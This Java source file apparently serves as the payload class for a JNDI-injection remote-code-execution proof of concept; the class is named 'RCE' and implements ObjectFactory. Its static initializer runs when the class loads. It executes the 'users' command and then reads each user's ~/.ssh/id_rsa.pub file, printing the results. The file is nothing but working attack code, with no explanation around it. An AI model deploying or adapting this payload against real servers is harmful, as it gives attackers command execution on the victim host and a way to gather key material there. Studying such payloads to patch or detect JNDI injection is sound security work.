import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Hashtable;

public class RCE implements ObjectFactory {
    static {
        System.out.println("\nRemote!!!\n");

        String[] cmd = {"users"};
        System.out.println("Executing " + Arrays.toString(cmd));
        ArrayList<String> users = new ArrayList<>();
        try {
            Process p;
            p = java.lang.Runtime.getRuntime().exec(cmd);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            while((line=br.readLine())!=null) {
                System.out.println(line);
                users.add(line.replaceAll("\r\n|\r|\n", ""));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        for (String user: users) {
            String[] cmd2 = {"cat", "/home/" + user + "/.ssh/id_rsa.pub"};
            System.out.println("Executing " + Arrays.toString(cmd2));
            try {
                Process p;
                p = java.lang.Runtime.getRuntime().exec(cmd2);
                InputStream fis = p.getInputStream();
                InputStreamReader isr = new InputStreamReader(fis);
                BufferedReader br = new BufferedReader(isr);
                String line = null;
                while ((line = br.readLine()) != null) {
                    System.out.println(line);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        System.out.println("\nFinish!!!\n");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return "TestRCE";
    }
}
